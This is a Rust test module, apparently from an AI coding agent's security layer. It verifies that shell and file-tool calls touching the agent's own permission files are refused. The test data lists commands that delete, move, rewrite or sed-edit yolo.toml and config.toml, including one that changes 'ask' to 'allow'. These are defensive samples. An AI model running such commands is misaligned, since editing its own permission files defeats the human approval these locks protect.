        assert!(lock_check(&rig, "read_file", serde_json::json!({"path": yolo})).is_none());
        assert!(
            protected_path_refusal(
                "write_file",
                &serde_json::json!({"path": yolo}),
                &rig.workdir,
                Some(&rig.home),
                &[]
            )
            .is_none()
        );
    }

    #[test]
    fn a_shell_line_naming_a_permission_file_is_refused() {
        let rig = lock_rig();
        let yolo = rig.home.join(".leviath/yolo.toml").display().to_string();
        for line in [
            "rm ~/.leviath/yolo.toml".to_string(),
            format!("mv {yolo} /tmp/x"),
            "echo x >> ~/.leviath/yolo.toml".to_string(),
            "sed -i 's/ask/allow/' ~/.leviath/yolo.toml".to_string(),
            "cd ~/.leviath && rm yolo.toml".to_string(),
            "cd ~/.leviath; cd tools && rm x.rhai".to_string(),
            "cp x ../home/.leviath/tools/".to_string(),
            "python3 -c \"open('$HOME/.leviath/yolo.toml','w')\"".to_string(),
            "python3 -c \"open('${HOME}/.leviath/config.toml','w')\"".to_string(),
            format!("echo `x` {yolo}"),
            "ls ~/.leviath/tools".to_string(),
        ] {
            let refusal = lock_check(&rig, "shell", serde_json::json!({"command": line}));
            assert!(refusal.is_some(), "{line} should be refused");
        }
        for line in [
            "ls -la",
            "cat config.toml",
            "cd src && cargo test",
            "echo x > out.txt",
            "cd ~ && ls",
            "echo `x`",
        ] {
            assert!(
                lock_check(&rig, "shell", serde_json::json!({"command": line})).is_none(),
                "{line}"
            );
        }
        assert!(lock_check(&rig, "shell", serde_json::json!({})).is_none());
        // With no home, `~` names nothing and the `$HOME` spellings do not exist.
        let none = protected_path_refusal(
            "shell",
            &serde_json::json!({"command": "rm ~/.leviath/yolo.toml"}),
            &rig.workdir,
            None,
            &rig.protected,
        );
        assert!(none.is_none());
        let abs = protected_path_refusal(
            "shell",
            &serde_json::json!({"command": format!("rm {yolo}")}),
            &rig.workdir,
            None,
            &rig.protected,
        );
        assert!(abs.is_some());
    }

    #[test]
    fn permission_files_follow_the_lock_switch() {
        crate::config::with_isolated_config_path("permission-files", |dir| {
            let mut config = Config::default();
            assert!(config.security.lock_permission_files, "on by default");
            let files = permission_files(&config);
            let labels: Vec<&str> = files.iter().map(|p| p.label).collect();
            assert!(labels.contains(&"config.toml"), "{labels:?}");
            assert!(labels.contains(&"yolo.toml"), "{labels:?}");
            assert!(labels.contains(&"mime_types.toml"), "{labels:?}");
            assert!(labels.contains(&"the taint policy"), "{labels:?}");
            assert!(labels.contains(&"the taint-gate rules"), "{labels:?}");
            assert_eq!(files[0].path, dir.join("config.toml"));
            assert_eq!(files[1].path, dir.join("yolo.toml"));
            assert_eq!(files[2].path, dir.join("mime_types.toml"));
            config.security.lock_permission_files = false;
            assert!(permission_files(&config).is_empty());
        });
    }
}
